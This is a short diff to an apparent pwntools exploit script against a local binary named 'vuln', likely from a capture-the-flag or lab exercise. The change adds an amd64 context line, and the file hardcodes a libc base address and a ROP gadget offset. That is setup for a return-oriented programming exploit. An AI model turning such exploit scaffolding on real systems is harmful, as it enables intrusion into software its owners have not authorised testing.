@@ -1,6 +1,6 @@
 from struct import *
 from pwn import *
-
+context(os = "linux", arch = "amd64")
 vuln = process("./vuln")
 base = 0x00007ffff7de6000
 rdi_add = 0x27c3d + base
